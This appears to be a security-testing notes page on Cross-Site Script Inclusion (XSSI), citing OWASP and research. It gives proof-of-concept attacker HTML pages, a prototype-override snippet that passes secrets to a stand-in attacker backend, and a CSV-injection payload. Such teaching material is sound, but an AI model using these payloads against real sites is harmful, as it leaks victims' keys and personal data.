Cross Site Script Inclusion (CSSI or XSSI) vulnerability allows sensitive data leakage across-origin or cross-domain boundaries.
XSSI is a client-side attack similar to [Cross-Site Request Forgery (CSRF)](Session%20Attacks%20(CSRF,%20session%20stealing,%20etc.).md#Cross-Site%20Request%20Forgery%20(CSRF)) but has a different purpose: is uses JavaScript on the client side to leak sensitive data from authenticated sessions.

By default, websites are only allowed to access data if they are from the same origin because of the [Same-origin policy (SOP)](Same-origin%20policy%20(SOP).md). However, this policy is not applicable for HTML `<script>` tag inclusions. When the browser opens a website with `<script>` tags, the resources are fetched from the cross-origin domain. The resources then run in the same context as the including site or browser, which presents the opportunity to leak sensitive data.

# XSSI vulnerabilities

Testers should analyze code for the following vehicles for data leakage via XSSI vulnerabilities: [^owasp][^hacktricks-xssi]
1. Global variables
2. Global function parameters + Prototype chaining using `this`
3. CSV (Comma Separated Values) with quotations theft
4. JavaScript runtime errors
6. [JSON with Padding (JSONP)](JSONP%20vulnerabilities.md#JSON%20with%20Padding%20(JSONP))

Use the [Burpsuite](../Tools/Burpsuite.md) extension [*Detect Dynamic JS](../Tools/Burpsuite.md#*Detect%20Dynamic%20JS) to identify dynamic javascript files containing possible user-related data


[^owasp]: [Testing for Cross Site Script Inclusion](https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/11-Client_Side_Testing/13-Testing_for_Cross_Site_Script_Inclusion), owasp.org
[^hacktricks-xssi]: [XSSI (Cross-Site Script Inclusion)](https://book.hacktricks.xyz/pentesting-web/xssi-cross-site-script-inclusion), book.hacktricks.xyz
## Global Variables

An API key is stored in a JavaScript file with the URI `https://victim.com/internal/api.js` on the victim’s website, `victim.com`, which is only accessible to authenticated users:

```js
(function() {
  window.secret = "supersecretUserAPIkey";
})();
```

The attack site, `attackingwebsite.com`, has an `index.html` with the following code:

```html
<!DOCTYPE html>
<html>
  <head>
    <title>Leaking data via global variables</title>
  </head>
  <body>
    <h1>Leaking data via global variables</h1>
    <script src="https://victim.com/internal/api.js"></script>
    <div id="result">
    </div>
    <script>
      var div = document.getElementById("result");
      div.innerHTML = "Your secret data <b>" + window.secret + "</b>";
    </script>
  </body>
</html>
```

An attacker lures the victim to `attackingwebsite.com` via social engineering, phishing emails, etc. The victim’s browser then fetches `api.js`, resulting in the sensitive data being leaked via the global JavaScript variable and displayed using `innerHTML`.

## Global Function Parameters + Prototype chaining using `this`

Like the case before, but the secret is read using a global function:


```js
(function() {
  var secret = "supersecretAPIkey";
  window.globalFunction(secret);
})();
```

Attacker can exfiltrate the data by defining a custom function with the same name:
```html
<!DOCTYPE html>
<html>
  <head>
    <title>Leaking data via global function parameters</title>
  </head>
  <body>
    <div id="result">
    </div>
    <script>
      function globalFunction(param) {
        var div = document.getElementById("result");
        div.innerHTML = "Your secret data: <b>" + param + "</b>";
      }
    </script>
    <script src="https://victim.com/internal/api.js"></script>
  </body>
</html>
```

If a variable does not reside inside the global namespace, sometimes this can be exploited anyway using _prototype tampering_. Prototype tampering abuses the design of JavaScript, namely that when interpreting code, JavaScript traverses the prototype chain to find the called property.  [^research]

[^research]: [The Unexpected Dangers of Dynamic JavaScript](https://www.usenix.org/system/files/conference/usenixsecurity15/sec15-paper-lekies.pdf), 

```js
(function(){
  var arr = ["secret1", "secret2", "secret3"];
  // intents to slice out first entry
  var x = arr.slice(1);
  ...
})();
```

In the original code `slice` from type `Array` accesses the data we’re interested in. An attacker can, as described in the preceding clause, override `slice` and steal the secrets.
```js
Array.prototype.slice = function(){
  // leaks ["secret1", "secret2", "secret3"]
  sendToAttackerBackend(this);
};
```

## CSV with Quotations Theft 

To leak data the attacker/tester has to be able to inject JavaScript code into the CSV data. [^xssi-csv]

[^xssi-csv]: [Identifier based XSSI attacks](https://www.mbsd.jp/Whitepaper/xssi.pdf), Takeshi Terada

```http
HTTP/1.1 200 OK
Content-Type: text/csv
Content-Disposition: attachment; filename="a.csv"
Content-Length: xxxx

1,"___","aaa@a.example","03-0000-0001"
2,"foo","bbb@b.example","03-0000-0002"
...
98,"bar","yyy@example.net","03-0000-0088"
99,"___","zzz@example.com","03-0000-0099"
```

In this example, using the `___` columns as injection points and inserting JavaScript strings in their place has the following result.

```csv
1,"\"",$$$=function(){/*","aaa@a.example","03-0000-0001"
2,"foo","bbb@b.example","03-0000-0002"
...
98,"bar","yyy@example.net","03-0000-0088"
99,"*/}//","zzz@example.com","03-0000-0099"
```

The first publicly documented XSSI attack was in 2006. Jeremiah Grossman’s blog entry Advanced Web Attack Techniques using GMail [^xssi-gmail] depicts a XSSI, which by overriding the Array constructor was able to read the complete address book of a google account.

[^xssi-gmail]: [Advanced Web Attack Techniques using GMail](https://blog.jeremiahgrossman.com/2006/01/advanced-web-attack-techniques-using.html), Jeremiah Grossman